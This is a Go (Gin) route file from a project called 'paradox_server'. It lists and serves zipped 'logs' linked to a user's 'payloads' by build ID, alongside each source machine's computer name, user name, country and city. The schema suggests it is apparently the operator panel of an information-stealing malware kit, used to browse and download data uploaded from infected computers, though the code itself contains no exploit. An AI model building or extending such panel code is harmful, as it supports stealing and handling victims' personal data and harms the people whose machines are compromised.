package routes

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"
	"paradox_server/fileops"
	"path/filepath"
	"time"

	"github.com/gin-gonic/gin"
)

func SetupLogRoutes(router *gin.RouterGroup, db *sql.DB) {
	router.GET("/logs", func(c *gin.Context) {
		handleListLogs(c, db)
	})
	router.GET("/download/logs/:uuid", func(c *gin.Context) {
		handleDownloadLogs(c, db)
	})
}

func handleListLogs(c *gin.Context, db *sql.DB) {
	log.Println("Received request to list logs")

	username := c.GetString("username")
	var userID int
	err := db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		log.Printf("Error getting user ID: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "Failed to get user ID",
		})
		return
	}

	rows, err := db.Query(`
		SELECT l.upload_uuid, l.build_id, l.timestamp, l.relative_log_path, 
			   si.computer_name, si.user_name, si.ip_country_name, si.ip_city_name
		FROM log_locations l
		LEFT JOIN system_info_logs si ON l.build_id = si.build_id
		INNER JOIN payloads p ON l.build_id = p.build_id
		WHERE p.user_id = ?
		ORDER BY l.timestamp DESC
	`, userID)
	if err != nil {
		log.Printf("Database error fetching logs: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to retrieve logs"})
		return
	}
	defer rows.Close()

	type LogEntry struct {
		UUID         string `json:"uuid"`
		BuildID      string `json:"build_id"`
		Timestamp    string `json:"timestamp"`
		Path         string `json:"path"`
		ComputerName string `json:"computer_name,omitempty"`
		UserName     string `json:"user_name,omitempty"`
		CountryName  string `json:"country_name,omitempty"`
		CityName     string `json:"city_name,omitempty"`
	}

	var logs []LogEntry

	for rows.Next() {
		var entry LogEntry
		var computerName, userName, countryName, cityName sql.NullString

		err := rows.Scan(
			&entry.UUID,
			&entry.BuildID,
			&entry.Timestamp,
			&entry.Path,
			&computerName,
			&userName,
			&countryName,
			&cityName,
		)
		if err != nil {
			log.Printf("Error scanning row: %v\n", err)
			continue
		}

		if computerName.Valid {
			entry.ComputerName = computerName.String
		}
		if userName.Valid {
			entry.UserName = userName.String
		}
		if countryName.Valid {
			entry.CountryName = countryName.String
		}
		if cityName.Valid {
			entry.CityName = cityName.String
		}

		logs = append(logs, entry)
	}

	if err := rows.Err(); err != nil {
		log.Printf("Error iterating rows: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Database error while retrieving logs"})
		return
	}

	log.Printf("Found %d logs for user %s\n", len(logs), username)
	c.JSON(http.StatusOK, gin.H{
		"logs":  logs,
		"count": len(logs),
	})
}

func handleDownloadLogs(c *gin.Context, db *sql.DB) {
	uploadUUID := c.Param("uuid")
	username := c.GetString("username")
	log.Printf("Received request to download logs for UUID: %s from user: %s\n", uploadUUID, username)

	var userID int
	err := db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userID)
	if err != nil {
		log.Printf("Error getting user ID: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "Failed to get user ID",
		})
		return
	}

	var buildID, relativePath string
	query := `
		SELECT l.build_id, l.relative_log_path 
		FROM log_locations l
		INNER JOIN payloads p ON l.build_id = p.build_id
		WHERE l.upload_uuid = ? AND p.user_id = ?
	`
	err = db.QueryRow(query, uploadUUID, userID).Scan(&buildID, &relativePath)
	if err != nil {
		if err == sql.ErrNoRows {
			log.Printf("Logs for UUID '%s' not found or not owned by user '%s'\n", uploadUUID, username)
			c.JSON(http.StatusNotFound, gin.H{"error": "Logs not found or access denied"})
		} else {
			log.Printf("Database error fetching logs for UUID '%s': %v\n", uploadUUID, err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Database error"})
		}
		return
	}

	baseLogDir := "./log-directory"
	logsPath := filepath.Join(baseLogDir, relativePath)

	if _, err := os.Stat(logsPath); os.IsNotExist(err) {
		log.Printf("Log directory not found for UUID '%s' at path '%s'\n", uploadUUID, logsPath)
		c.JSON(http.StatusNotFound, gin.H{"error": "Log files not found on server"})
		return
	}

	zipFileName := fmt.Sprintf("logs_%s.zip", uploadUUID)
	tempZipPath := filepath.Join(os.TempDir(), zipFileName)

	if err := fileops.ZipDirectory(logsPath, tempZipPath); err != nil {
		log.Printf("Error zipping logs for UUID '%s': %v\n", uploadUUID, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to zip log files"})
		return
	}

	log.Printf("Serving logs for UUID '%s' from '%s' to user '%s'\n", uploadUUID, logsPath, username)
	c.FileAttachment(tempZipPath, zipFileName)

	go func() {
		time.Sleep(5 * time.Minute)
		os.Remove(tempZipPath)
	}()
}
